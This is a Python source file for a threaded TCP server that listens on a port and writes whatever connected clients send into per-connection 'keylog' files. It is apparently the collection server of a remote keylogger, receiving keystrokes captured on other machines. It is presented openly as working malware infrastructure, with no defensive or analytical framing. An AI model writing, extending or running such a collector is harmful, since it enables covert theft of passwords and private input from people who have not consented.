import datetime
import os
import socket
import sys
import threading
import time

import settings


class Logger:
    @classmethod
    def _log(cls, prefix: str, message: str) -> None:
        log_string = (
            f"{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')} - "
            f"Logger:{prefix} - {message}"
        )
        with open(os.path.join(get_log_dir(), "activity.log"), "a+") as log:
            log.write(log_string + "\n")
        print(log_string)

    @classmethod
    def info(cls, message: str) -> None:
        cls._log("INFO", message)

    @classmethod
    def error(cls, message: str) -> None:
        cls._log("ERROR", message)

    @classmethod
    def debug(cls, message: str) -> None:
        if settings.DEBUG:
            cls._log("DEBUG", message)


class Client:
    def __init__(self, conn: socket.socket, addr: tuple) -> None:
        self._conn = conn
        self._addr = addr
        self._init_timestamp = int(time.time())

    def listen(self) -> None:
        with open(
            os.path.join(get_log_dir(), f"keylog_{self._init_timestamp}.log"), "w+"
        ) as log:
            log.write("Keylogs for client connected from {}:{}\n\n".format(*self._addr))
            log.flush()
            Logger.info("Listening for data from {}:{}".format(*self._addr))
            while True:
                try:
                    data = self._conn.recv(1024).decode()
                    if not data:
                        break
                except OSError as error:
                    Logger.debug(error)
                    break
                else:
                    log.write(data)
                    log.flush()
        Logger.info("Disconnection from {}:{}".format(*self._addr))


def get_log_dir() -> str:
    logdir = os.path.normpath(os.path.join(os.path.dirname(__file__), settings.LOG_DIR))
    if not os.path.exists(logdir):
        try:
            os.makedirs(logdir)
        except PermissionError:
            return
    return logdir


def main(host: str = "0.0.0.0", port: int = 6000) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ls:
        ls.bind((host, port))
        ls.listen()
        Logger.info(f"Listening on {host}:{port}")
        while True:
            conn, addr = ls.accept()
            Logger.info("Connection from {}:{}".format(*addr))
            threading.Thread(target=Client(conn, addr).listen).start()


if __name__ == "__main__":
    if not get_log_dir():
        Logger.error("PermissionError: Unable to create log directory.")
    else:
        try:
            main(settings.HOST, settings.PORT)
        except AttributeError as error:
            Logger.error(error)
